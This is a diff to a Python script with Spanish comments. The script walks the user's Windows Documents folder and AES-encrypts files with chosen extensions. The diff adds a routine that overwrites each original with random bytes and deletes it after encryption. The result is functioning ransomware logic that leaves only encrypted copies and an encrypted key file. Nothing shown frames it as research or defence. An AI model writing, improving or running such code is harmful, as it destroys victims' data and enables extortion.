@@ -1,5 +1,6 @@
 import os
 import base64
+import shutil
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 from Crypto.Util.Padding import pad
@@ -35,6 +36,17 @@ def cifrar_archivo_aes(archivo, clave_aes):
     with open(archivo + '.enc', 'wb') as f:
         f.write(iv + datos_cifrados)
 
+# Función para borrar un archivo de forma segura
+def borrar_archivo_seguro(archivo):
+    # Sobrescribir el archivo con datos aleatorios antes de eliminarlo
+    with open(archivo, 'ba+', buffering=0) as f:
+        length = f.tell()
+        f.seek(0)
+        f.write(os.urandom(length))  # Sobrescribir con datos aleatorios
+
+    # Eliminar el archivo después de sobrescribirlo
+    os.remove(archivo)
+
 # Obtener el directorio "Documents" del usuario
 user_profile = os.environ['USERPROFILE']
 documents_dir = os.path.join(user_profile, 'Documents')
@@ -68,6 +80,9 @@ for foldername, subfolders, filenames in os.walk(documents_dir):
     for filename in filenames:
         if any(filename.endswith(ext) for ext in extensions):
             file_path = os.path.join(foldername, filename)
-            cifrar_archivo_aes(file_path, clave_aes)  # Cifrar el archivo con AES
+            # Cifrar el archivo con AES
+            cifrar_archivo_aes(file_path, clave_aes)
+            # Borrar de forma segura el archivo original
+            borrar_archivo_seguro(file_path)
 
-print(f'Archivos cifrados con AES-256 en {documents_dir}. La clave AES cifrada ha sido guardada como "clave_aes_cifrada.txt".')
+print(f'Archivos cifrados con AES-256 en {documents_dir}. La clave AES cifrada ha sido guardada en "clave_aes_cifrada.txt". Los archivos originales han sido eliminados de forma segura.')
